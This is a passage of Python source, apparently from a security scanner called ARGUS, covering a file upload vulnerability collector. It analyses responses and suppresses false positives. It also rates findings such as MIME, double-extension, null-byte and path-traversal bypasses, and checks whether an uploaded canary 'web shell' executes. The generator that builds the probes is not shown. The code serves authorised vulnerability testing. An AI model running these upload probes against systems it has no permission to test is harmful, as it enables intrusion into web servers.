                get_resp = self.client.request(
                    "GET",
                    response.storage_url,
                    timeout=self.timeout,
                )
            else:
                get_resp = None

            if get_resp and getattr(get_resp, "status_code", 0) in (200, 206):
                response.web_shell_status_code = getattr(get_resp, "status_code", 0)
                get_body = getattr(get_resp, "body", "") or getattr(get_resp, "raw_body", "") or ""
                response.web_shell_body = get_body

                # Check if canary token is reflected in GET response
                if canary_token and canary_token in get_body:
                    response.is_reflected = True
                    # Check if executed (canary present without raw <?php or <% source tags)
                    if "<?" not in get_body and "<%" not in get_body:
                        response.web_shell_executed = True
                    else:
                        response.web_shell_executed = False

        except Exception as e:
            logger.debug(f"FileUploadProber: Secondary shell reachability check failed: {e}")


# =============================================================================
# Response Analyzer
# =============================================================================

class FileUploadAnalyzer:
    """
    Evaluates file upload probe outcomes, performs rigorous path disclosure analysis,
    verifies canary execution, and applies strict false positive rejection.
    """

    # Server storage path patterns
    PATH_PATTERNS = [
        re.compile(r'(/var/www/(?:html/)?[a-zA-Z0-9_\-./]+)', re.IGNORECASE),
        re.compile(r'(/usr/share/nginx/[a-zA-Z0-9_\-./]+)', re.IGNORECASE),
        re.compile(r'(/home/[a-zA-Z0-9_\-]+/public_html/[a-zA-Z0-9_\-./]+)', re.IGNORECASE),
        re.compile(r'(/app/(?:uploads/|static/)?[a-zA-Z0-9_\-./]+)', re.IGNORECASE),
        re.compile(r'([A-Za-z]:\\inetpub\\wwwroot\\[a-zA-Z0-9_\-\\.]+)', re.IGNORECASE),
        re.compile(r'([A-Za-z]:\\Windows\\(?:Temp\\)?[a-zA-Z0-9_\-\\.]+)', re.IGNORECASE),
        re.compile(r'((?:https?://)?(?:[a-zA-Z0-9_\-]+\.)*s3(?:\.[a-zA-Z0-9_\-]+)?\.amazonaws\.com/[a-zA-Z0-9_\-./]+)', re.IGNORECASE),
        re.compile(r'((?:https?://)?storage\.googleapis\.com/[a-zA-Z0-9_\-./]+)', re.IGNORECASE),
    ]

    # Error message information disclosure patterns
    ERROR_PATTERNS = [
        re.compile(r'(Fatal error:.*in\s+([/\\]\S+)\s+on line\s+\d+)', re.IGNORECASE),
        re.compile(r'(Exception in thread.*|Traceback \(most recent call last\):)', re.IGNORECASE),
        re.compile(r'(System\.Web\.HttpException.*|Microsoft VBScript runtime error)', re.IGNORECASE),
        re.compile(r'(org\.apache\.catalina\..*|java\.lang\.NullPointerException)', re.IGNORECASE),
        re.compile(r'(FileUploadException:.*|Invalid file extension:.*)', re.IGNORECASE),
    ]

    # Rejection keywords indicating proper file validation
    REJECTION_PATTERNS = [
        re.compile(r'file type (?:is )?not allowed', re.IGNORECASE),
        re.compile(r'invalid (?:file )?extension', re.IGNORECASE),
        re.compile(r'only (?:images|png|jpg|pdf) are allowed', re.IGNORECASE),
        re.compile(r'disallowed (?:mime|file) type', re.IGNORECASE),
        re.compile(r'executable files are forbidden', re.IGNORECASE),
        re.compile(r'upload rejected', re.IGNORECASE),
        re.compile(r'unsupported media type', re.IGNORECASE),
    ]

    def __init__(self):
        pass

    def detect_storage_path_disclosure(self, body: str) -> Optional[str]:
        """Detects physical file system or cloud storage paths leaked in the response."""
        if not body:
            return None
        for pat in self.PATH_PATTERNS:
            m = pat.search(body)
            if m:
                return m.group(1)
        return None

    def detect_error_disclosure(self, body: str) -> Optional[str]:
        """Detects stack traces, framework backtraces, and error disclosures."""
        if not body:
            return None
        for pat in self.ERROR_PATTERNS:
            m = pat.search(body)
            if m:
                return m.group(0)[:300]
        return None

    def is_false_positive(
        self,
        probe: FileUploadProbe,
        response: FileUploadResponse,
    ) -> bool:
        """
        Applies strict false positive suppression rules:
        1. Benign probes are never reported.
        2. Network timeout / zero status are rejected.
        3. 400/403/415/422 with validation error messages are rejected, UNLESS error disclosure / stack trace is present.
        4. Filename reflection in error messages without upload or info disclosure is rejected.
        5. Randomized UUID renaming without storage reachability or execution.
        """
        # 1. Benign probe
        if probe.is_benign:
            return True

        # 2. Network timeout / zero status
        if response.status_code == 0 or response.error:
            return True

        # Check for error or storage path disclosure before rejecting error status codes
        body = response.body or ""
        has_error_disclosure = bool(self.detect_error_disclosure(body))
        has_path_disclosure = bool(self.detect_storage_path_disclosure(body)) or bool(response.storage_path_disclosed)

        # 3. Explicit HTTP error status code with rejection pattern
        if response.status_code in (400, 401, 403, 404, 405, 415, 422, 500):
            if not has_error_disclosure and not has_path_disclosure:
                body_lower = body.lower()
                for pat in self.REJECTION_PATTERNS:
                    if pat.search(body_lower):
                        return True
                # If 403/415 without any storage/reflection, definitely rejected
                if response.status_code in (403, 415) and not response.is_reflected and not response.storage_path_disclosed:
                    return True

        # 4. Filename reflected only in an error message without acceptance and without info disclosure
        if response.status_code >= 400 and not response.web_shell_executed and not response.storage_url:
            if not has_error_disclosure and not has_path_disclosure:
                return True

        # 5. Randomized UUID renaming check: if server returned 200/201 but completely renamed
        # the file to a safe UUID with safe non-executable extension, and web shell check failed
        if response.status_code in (200, 201) and not response.web_shell_executed and not response.is_reflected:
            dest_ext = None
            if response.storage_url:
                parsed_u = urllib.parse.urlparse(response.storage_url)
                dest_ext = os.path.splitext(parsed_u.path)[1].lower()
            elif body:
                # Check for UUID pattern with extension in body
                uuid_match = re.search(r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}(\.[a-zA-Z0-9]+)', body)
                if uuid_match:
                    dest_ext = uuid_match.group(1).lower()
                else:
                    try:
                        data = json.loads(body)
                        if isinstance(data, dict):
                            for k in ("url", "file_url", "path", "location"):
                                if k in data and isinstance(data[k], str):
                                    ext = os.path.splitext(urllib.parse.urlparse(data[k]).path)[1].lower()
                                    if ext:
                                        dest_ext = ext
                                        break
                    except Exception:
                        pass

            safe_exts = {".png", ".jpg", ".jpeg", ".gif", ".pdf", ".txt", ".bin", ".dat"}
            if dest_ext and dest_ext in safe_exts:
                return True

        return False

    def evaluate_probe(
        self,
        probe: FileUploadProbe,
        response: FileUploadResponse,
        target_url: str,
    ) -> Optional[FileUploadResult]:
        """
        Evaluates a file upload probe and response to produce a calibrated FileUploadResult finding.
        """
        if self.is_false_positive(probe, response):
            return None

        # Check storage path disclosure
        path_disclosed = self.detect_storage_path_disclosure(response.body) or response.storage_path_disclosed
        error_disclosed = self.detect_error_disclosure(response.body)

        # Evaluate finding severity, CWE, CVSS, and description based on technique & outcome
        technique = probe.technique if isinstance(probe.technique, str) else probe.technique.value
        strategy = probe.strategy if isinstance(probe.strategy, str) else probe.strategy.value
        target_rt = probe.target_runtime if isinstance(probe.target_runtime, str) else probe.target_runtime.value

        # Default properties
        cwe_id = "CWE-434"
        cvss_score = 9.8
        severity = FileUploadSeverity.CRITICAL.value
        template_id = f"file-upload-{technique.replace('_', '-')}"
        confidence = 0.95

        # 1. Web shell execution verified (Canary executed on server)
        if response.web_shell_executed:
            title = f"Arbitrary File Upload & Web Shell Execution ({target_rt.upper()})"
            desc = (
                f"Successfully uploaded and executed an arbitrary {target_rt.upper()} script at {target_url}. "
                f"The safe canary token '{probe.canary_token}' was verified and executed at {response.storage_url}."
            )
            severity = FileUploadSeverity.CRITICAL.value
            cvss_score = 9.8
            cwe_id = "CWE-434"

        # If HTTP response indicates failure/error status (>= 400), evaluate as info disclosure (CWE-200)
        elif response.status_code >= 400:
            if path_disclosed or error_disclosed:
                title = f"File Upload Information Disclosure on {target_url}"
                desc = (
                    f"File upload interaction on {target_url} disclosed internal server storage paths or stack traces: "
                    f"{path_disclosed or error_disclosed}"
                )
                severity = FileUploadSeverity.MEDIUM.value
                cvss_score = 5.3
                cwe_id = "CWE-200"
                technique = FileUploadTechnique.STORAGE_PATH_DISCLOSURE.value
            else:
                return None

        # 2. Unrestricted executable file accepted (200/201 without validation)
        elif technique == FileUploadTechnique.UNRESTRICTED_UPLOAD.value:
            title = f"Unrestricted File Upload: {probe.filename} on {target_url}"
            desc = (
                f"The endpoint at {target_url} accepted an executable file ({probe.filename}) "
                f"with Content-Type '{probe.content_type}' without server-side extension or content validation."
            )
            severity = FileUploadSeverity.CRITICAL.value
            cvss_score = 9.8
            cwe_id = "CWE-434"

        # 3. MIME type bypass accepted
        elif technique == FileUploadTechnique.MIME_TYPE_BYPASS.value:
            title = f"MIME Type Bypass File Upload: {probe.filename}"
            desc = (
                f"The endpoint at {target_url} allowed uploading an executable file ({probe.filename}) "
                f"by spoofing the Content-Type header to '{probe.content_type}'."
            )
            severity = FileUploadSeverity.HIGH.value
            cvss_score = 8.1
            cwe_id = "CWE-436"

        # 4. Double extension bypass accepted
        elif technique == FileUploadTechnique.DOUBLE_EXTENSION_BYPASS.value:
            title = f"Double Extension Bypass: {probe.filename}"
            desc = (
                f"The endpoint at {target_url} accepted a dangerous double extension filename ({probe.filename}), "
                f"allowing bypass of extension blacklists."
            )
            severity = FileUploadSeverity.HIGH.value
            cvss_score = 8.1
            cwe_id = "CWE-436"

        # 5. Polyglot magic bytes accepted
        elif technique == FileUploadTechnique.POLYGLOT_MAGIC_BYTES.value:
            title = f"Polyglot Magic Bytes Upload: {probe.filename}"
            desc = (
                f"The endpoint at {target_url} accepted a polyglot file ({probe.filename}) combining valid image/document "
                f"magic byte headers with embedded executable code."
            )
            severity = FileUploadSeverity.HIGH.value
            cvss_score = 8.1
            cwe_id = "CWE-436"

        # 6. Path traversal in filename
        elif technique == FileUploadTechnique.PATH_TRAVERSAL_FILENAME.value:
            title = f"Path Traversal in Upload Filename: {probe.filename}"
            desc = (
                f"The endpoint at {target_url} accepted directory traversal sequences in the upload filename ({probe.filename}), "
                f"allowing arbitrary file placement across the file system."
            )
            severity = FileUploadSeverity.HIGH.value
            cvss_score = 8.1
            cwe_id = "CWE-22"

        # 7. Null byte injection
        elif technique == FileUploadTechnique.NULL_BYTE_INJECTION.value:
            title = f"Null Byte Injection in Upload Filename: {probe.filename}"
            desc = (
                f"The endpoint at {target_url} accepted a null-byte poisoned filename ({probe.filename}), "
                f"allowing truncation and bypass of extension validation."
            )
            severity = FileUploadSeverity.HIGH.value
            cvss_score = 8.1
            cwe_id = "CWE-434"

        # 8. Storage Path or Error Disclosure only
        elif path_disclosed or error_disclosed:
            title = f"File Upload Information Disclosure on {target_url}"
            desc = (
                f"File upload interaction on {target_url} disclosed internal server storage paths or stack traces: "
                f"{path_disclosed or error_disclosed}"
            )
            severity = FileUploadSeverity.MEDIUM.value
            cvss_score = 5.3
            cwe_id = "CWE-200"
            technique = FileUploadTechnique.STORAGE_PATH_DISCLOSURE.value

        else:
            title = f"File Upload Vulnerability: {probe.filename}"
            desc = f"File upload probe ({probe.filename}) succeeded on {target_url}."

        evidence_snippet = response.body[:250] if response.body else f"HTTP {response.status_code}"

        return FileUploadResult(
            template_id=template_id,
            technique=technique,
            vulnerability_type=probe.technique,
            mutation_strategy=strategy,
            filename=probe.filename,
            content_type=probe.content_type,
            severity=severity,
            cwe_id=cwe_id,
            cvss_score=cvss_score,
            description=desc,
            evidence_snippet=evidence_snippet,
            target_url=target_url,
            storage_path=path_disclosed,
            uploaded_file_url=response.storage_url,
            canary_token=probe.canary_token,
            target_runtime=target_rt,
            status_code=response.status_code,
            confidence=confidence,
            is_valid_finding=True,
        )


# =============================================================================
# Collector & Orchestration Engine
# =============================================================================

class FileUploadCollector(BaseCollector):
    """
    Active security collector for File Upload Vulnerabilities in ARGUS.
    Orchestrates probe generation, multipart request dispatch, response analysis,
    and quadruple state publishing.
    """

    def __init__(
        self,
        http_client: Optional[Any] = None,
        prober: Optional[FileUploadProber] = None,
        generator: Optional[FileUploadPayloadGenerator] = None,
        analyzer: Optional[FileUploadAnalyzer] = None,
        timeout: float = 10.0,
        max_probes_per_endpoint: int = 50,
        client: Optional[Any] = None,
    ):
        effective_client = client or http_client or AuthenticatedHttpClient(timeout=timeout)
        self.http_client = effective_client
        self.prober = prober or FileUploadProber(client=self.http_client, timeout=timeout)
        self.generator = generator or FileUploadPayloadGenerator()
        self.analyzer = analyzer or FileUploadAnalyzer()
        self.timeout = timeout
        self.max_probes_per_endpoint = max_probes_per_endpoint

    def _discover_candidate_endpoints(self, mission: Any) -> List[str]:
        """Discovers candidate file upload endpoints from mission state."""
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))
        candidates: Set[str] = set()

        # 0. From mission.inputs
        inputs = getattr(mission, "inputs", None) or getattr(raw_mission, "inputs", None) or {}
        if isinstance(inputs, dict):
            for ep in inputs.get("endpoints", []) or []:
                if isinstance(ep, dict):
                    url = ep.get("url") or ep.get("path")
                    if url:
                        candidates.add(str(url))
                elif isinstance(ep, str):
                    candidates.add(ep)

        # 1. From mission.endpoints
        for ep in getattr(raw_mission, "endpoints", []) or []:
            if isinstance(ep, dict):
                url = ep.get("url") or ep.get("path")
                if url:
                    candidates.add(str(url))
            elif isinstance(ep, str):
                candidates.add(ep)

        # 2. From mission.live_hosts (fallback if no explicit endpoints found)
        if not candidates:
            for lh in getattr(raw_mission, "live_hosts", []) or []:
                if isinstance(lh, dict):
                    url = lh.get("url")
                    if url:
                        candidates.add(str(url))
                elif isinstance(lh, str):
                    candidates.add(lh)

        # 3. From mission.target (fallback if no explicit endpoints or live_hosts found)
        if not candidates:
            target = getattr(raw_mission, "target", "")
            if target:
                if not str(target).startswith("http://") and not str(target).startswith("https://"):
                    candidates.add(f"https://{target}")
                else:
                    candidates.add(str(target))

        # 4. From mission.evidence (fallback if still empty)
        if not candidates:
            evidence_list = getattr(raw_mission, "evidence", [])
            if hasattr(evidence_list, "all"):
                evidence_items = evidence_list.all()
            elif isinstance(evidence_list, (list, tuple, set)):
                evidence_items = list(evidence_list)
            else:
                evidence_items = []

            for ev in evidence_items:
                meta = getattr(ev, "metadata", {}) or {}
                if isinstance(meta, dict):
                    url = meta.get("url") or meta.get("endpoint")
                    if url and ("http://" in str(url) or "https://" in str(url)):
                        candidates.add(str(url))

        # Normalize valid candidate URLs
        valid_urls = []
        for url in candidates:
            if url and (url.startswith("http://") or url.startswith("https://")):
                valid_urls.append(url)
            elif url and not url.startswith("http://") and not url.startswith("https://") and "." in url:
                valid_urls.append(f"https://{url}")

        return valid_urls

    def _emit_evidence(
        self,
        mission: Any,
        result: FileUploadResult,
        target_url: str,
        base_url: str,
    ) -> Evidence:
        """Publishes validated File Upload finding with Quadruple State Mutation."""
        title = f"File Upload Vulnerability: {result.technique} on {target_url}"
        description = (
            f"{result.description} Filename: {result.filename}, "
            f"Content-Type: {result.content_type}, Strategy: {result.mutation_strategy}"
        )
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))

        ev = Evidence(
            category="file_upload",
            value=f"file_upload:{result.template_id}:{target_url}:{result.filename}",
            source="file_upload",
            status="CONFIRMED",
            confidence=result.confidence,
            severity=result.severity,
            title=title,
            description=description,
            provenance=ProvenanceData(
                observation_id=str(uuid.uuid4()),
                step_id=f"step_{result.technique}",
            ),
            tags=["file_upload", "upload_security", str(result.vulnerability_type), result.mutation_strategy],
            metadata={
                "url": target_url,
                "host": base_url,
                "template_id": result.template_id,
                "technique": result.technique,
                "vulnerability_type": str(result.vulnerability_type),
                "filename": result.filename,
                "content_type": result.content_type,
                "mutation_strategy": result.mutation_strategy,
                "strategy": result.mutation_strategy,
                "target_runtime": result.target_runtime,
                "canary_token": result.canary_token,
                "storage_path": result.storage_path,
                "uploaded_file_url": result.uploaded_file_url,
                "status_code": result.status_code,
                "evidence_snippet": result.evidence_snippet[:250],
                "parameter": result.filename,
                "cwe_id": result.cwe_id,
                "cvss_score": result.cvss_score,
                "is_valid_finding": result.is_valid_finding,
            },
        )

        # 1. Update raw_mission.evidence
        if hasattr(raw_mission, "evidence") and raw_mission.evidence is not None:
            if hasattr(raw_mission.evidence, "add"):
                raw_mission.evidence.add(ev)
            elif isinstance(raw_mission.evidence, list):
                raw_mission.evidence.append(ev)

        # 2. Update raw_mission.vulnerabilities
        if hasattr(raw_mission, "vulnerabilities") and isinstance(raw_mission.vulnerabilities, list):
            raw_mission.vulnerabilities.append({
                "name": title,
                "template_id": result.template_id,
                "severity": result.severity,
                "host": base_url,
                "url": target_url,
                "description": description,
                "technique": result.technique,
                "filename": result.filename,
                "parameter": result.filename,
                "strategy": result.mutation_strategy,
                "cwe_id": result.cwe_id,
                "cvss_score": result.cvss_score,
            })

        # 3. Attack Surface Knowledge Graph Expansion
        graph = getattr(raw_mission, "attack_surface_graph", None) or getattr(raw_mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{base_url}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{result.template_id}:{target_url}:{result.filename}"

            parsed_b = urllib.parse.urlparse(base_url)
            graph.add(Node(id=lh_id, type="live_host", value=base_url, metadata={"url": base_url, "host": parsed_b.hostname or base_url}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": result.status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=title, metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        # 4. ControlledMission wrapper notification
        if hasattr(mission, "publish_finding"):
            try:
                mission.publish_finding(ev.evidence_id, ev)
            except Exception:
                pass

        return ev

    def collect(self, mission: Any) -> List[Evidence]:
        """Collects File Upload findings across all discovered candidate endpoints."""
        endpoints = self._discover_candidate_endpoints(mission)
        collected_evidence: List[Evidence] = []
        all_probes = self.generator.generate_all_probes()

        for target_url in endpoints:
            parsed = urllib.parse.urlparse(target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else target_url

            probes_to_run = all_probes[:self.max_probes_per_endpoint]
            for probe in probes_to_run:
                resp = self.prober.execute_upload(mission, target_url, probe)
                result = self.analyzer.evaluate_probe(probe, resp, target_url)
                if result and result.is_valid_finding:
                    ev = self._emit_evidence(mission, result, target_url, base_url)
                    collected_evidence.append(ev)

        return collected_evidence

    def execute(self, mission: Any) -> List[Evidence]:
        """Plugin execution alias for collect()."""
        return self.collect(mission)


# =============================================================================
# Backwards Compatibility & Tool Aliases
# =============================================================================

UploadVulnerabilityCollector = FileUploadCollector
FileUploadSecurityCollector = FileUploadCollector
UnrestrictedFileUploadCollector = FileUploadCollector
ArbitraryFileUploadCollector = FileUploadCollector
